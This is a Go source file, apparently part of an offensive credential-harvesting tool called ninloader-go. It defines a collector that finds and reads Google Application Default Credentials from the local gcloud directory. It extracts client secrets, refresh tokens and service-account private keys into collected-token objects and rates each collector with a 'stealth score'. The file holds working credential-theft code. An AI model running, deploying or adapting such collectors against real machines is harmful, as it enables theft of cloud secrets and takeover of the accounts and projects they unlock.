package google

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"

	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/platform"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
)

// ADCCollector reads Google Application Default Credentials from
// application_default_credentials.json in the gcloud config directory.
type ADCCollector struct {
	collector.BaseCollector
}

func init() {
	registry.Register("google", "adc", func() collector.Collector {
		return &ADCCollector{BaseCollector: collector.BaseCollector{Svc: "google", Src: "adc"}}
	})
}

func (c *ADCCollector) Service() string      { return c.Svc }
func (c *ADCCollector) Source() string        { return c.Src }
func (c *ADCCollector) StealthScore() int     { return 5 }
func (c *ADCCollector) Platforms() []string   { return nil } // all platforms
func (c *ADCCollector) IsPlatformSupported() bool { return true }

func (c *ADCCollector) adcPath() string {
	return filepath.Join(platform.GcloudDir(), "application_default_credentials.json")
}

// Discover checks whether the ADC file exists and returns a discovery hint.
func (c *ADCCollector) Discover() []*types.DiscoveredToken {
	path := c.adcPath()
	raw, err := os.ReadFile(path)
	if err != nil {
		return nil
	}

	var data map[string]any
	if err := json.Unmarshal(raw, &data); err != nil {
		c.Warn(fmt.Sprintf("Failed to parse %s: %v", path, err))
		return nil
	}

	credType, _ := data["type"].(string)
	if credType == "" {
		credType = "unknown"
	}
	clientID, _ := data["client_id"].(string)
	_, hasRefresh := data["refresh_token"]

	details := fmt.Sprintf("type=%s", credType)
	if hasRefresh {
		details += ", has_refresh_token"
	}

	accountHint := clientID
	if len(accountHint) > 20 {
		accountHint = accountHint[:20] + "..."
	}

	return []*types.DiscoveredToken{{
		Service:      c.Svc,
		Source:       c.Src,
		Path:         path,
		AccountHint:  accountHint,
		StealthScore: 5,
		Details:      details,
	}}
}

// Collect reads and parses the ADC file, returning collected tokens for
// authorized_user or service_account credential types.
func (c *ADCCollector) Collect() []*types.CollectedToken {
	path := c.adcPath()
	raw, err := os.ReadFile(path)
	if err != nil {
		return nil
	}

	var data map[string]any
	if err := json.Unmarshal(raw, &data); err != nil {
		c.Warn(fmt.Sprintf("Failed to collect from %s: %v", path, err))
		return nil
	}

	credType, _ := data["type"].(string)

	switch credType {
	case "authorized_user":
		return c.collectAuthorizedUser(data)
	case "service_account":
		return c.collectServiceAccount(data)
	default:
		c.Warn(fmt.Sprintf("Unknown ADC type: %s", credType))
		return nil
	}
}

func (c *ADCCollector) collectAuthorizedUser(data map[string]any) []*types.CollectedToken {
	clientID, _ := data["client_id"].(string)
	clientSecret, _ := data["client_secret"].(string)
	refreshToken, _ := data["refresh_token"].(string)
	quotaProjectID, _ := data["quota_project_id"].(string)

	tok := types.NewCollectedToken(c.Svc, c.Src, 5)
	tok.ClientID = clientID
	tok.ClientSecret = types.Secure(clientSecret)
	tok.RefreshToken = types.Secure(refreshToken)
	tok.TokenURI = "https://oauth2.googleapis.com/token"
	tok.Extra["type"] = "authorized_user"
	tok.Extra["quota_project_id"] = quotaProjectID

	return []*types.CollectedToken{tok}
}

func (c *ADCCollector) collectServiceAccount(data map[string]any) []*types.CollectedToken {
	clientID, _ := data["client_id"].(string)
	clientEmail, _ := data["client_email"].(string)
	privateKey, _ := data["private_key"].(string)
	projectID, _ := data["project_id"].(string)
	privateKeyID, _ := data["private_key_id"].(string)
	tokenURI, _ := data["token_uri"].(string)
	if tokenURI == "" {
		tokenURI = "https://oauth2.googleapis.com/token"
	}

	tok := types.NewCollectedToken(c.Svc, c.Src, 5)
	tok.AccountID = clientID
	tok.Username = clientEmail
	tok.ClientID = clientID
	tok.ClientSecret = types.Secure(privateKey)
	tok.TokenURI = tokenURI
	tok.Extra["type"] = "service_account"
	tok.Extra["project_id"] = projectID
	tok.Extra["private_key_id"] = privateKeyID

	return []*types.CollectedToken{tok}
}
